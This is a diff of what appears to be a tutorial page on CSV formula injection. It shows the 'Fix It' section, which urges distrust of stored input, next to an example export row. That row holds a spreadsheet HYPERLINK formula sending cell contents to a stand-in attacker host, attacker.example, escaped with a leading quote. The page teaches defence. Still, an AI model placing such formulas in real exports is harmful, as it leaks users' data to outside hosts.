@@ -167,11 +167,13 @@ Zoë Łukasiewicz,zoe@example.com,Café "Kraków",13.99
             someone exports the list.
         </p>
         <heading h2 id="fix-it">Fix It</heading>
-        <p>
-            You've read this one so many times you could set it to music.
-            <strong>Never trust input,</strong> and that includes input that's been sitting in your
-            database. Look at the real export's version of the same row:
-        </p>
+        <nti>
+            <p>
+                You've read this one so many times you could set it to music.
+                <strong>Never trust input,</strong> and that includes input that's been sitting in
+                your database. Look at the real export's version of the same row:
+            </p>
+        </nti>
         <!-- prettier-ignore -->
         <code-block>"'=HYPERLINK(""https://attacker.example/?leak=""&amp;B2,""Click for details"")",mallory@example.com,"Totally Real Ltd",0.00,"2026-11-20 08:00:00"</code-block>
         <p>
